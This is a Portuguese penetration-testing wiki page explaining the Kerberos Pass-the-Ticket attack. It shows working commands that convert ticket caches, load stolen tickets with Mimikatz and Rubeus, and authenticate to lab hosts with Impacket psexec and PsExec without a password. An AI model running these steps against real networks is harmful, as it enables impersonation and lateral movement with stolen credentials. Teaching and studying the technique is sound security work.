# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Em um ataque Pass-the-Ticket (PtT), um adversário usa um ticket Kerberos roubado para se autenticar como o principal do ticket sem possuir a senha dessa conta. Um ticket-granting ticket (TGT) pode ser usado para solicitar service tickets, enquanto um service ticket roubado é limitado ao serviço de destino e ao período de validade.<sup>[[1]](#references)</sup>

Para conhecer técnicas de aquisição de tickets, consulte:

- [Coletando tickets do Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Coletando tickets do Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Convertendo formatos de tickets do Linux e do Windows

Os caches Kerberos geralmente aparecem como arquivos MIT `ccache` no Linux e arquivos `.kirbi` no Windows. `ticket_converter` converte entre esses formatos usando um ticket de entrada e um caminho de saída.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
O Kekeo também fornece ferramentas para tickets Kerberos no Windows.<sup>[[3]](#references)</sup>

## Usando um Ticket

No Linux, aponte `KRB5CCNAME` para o cache e instrua um cliente Impacket a usar Kerberos sem solicitar uma senha:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
No Windows, Mimikatz ou Rubeus podem importar um ticket `.kirbi` para a sessão de logon atual. Use `klist` para inspecionar o cache resultante.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
A importação de tickets não concede privilégios além daqueles representados pelo ticket e pela política de autorização do serviço de destino. Tickets expirados, revogados, malformados ou com escopo incorreto podem falhar.<sup>[[1]](#references)</sup>

Para obter um contexto mais amplo sobre ataques Kerberos e técnicas relacionadas de aquisição de tickets, consulte o guia de ataques Kerberos da Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Exemplos do Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Técnicas de ataque ao Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
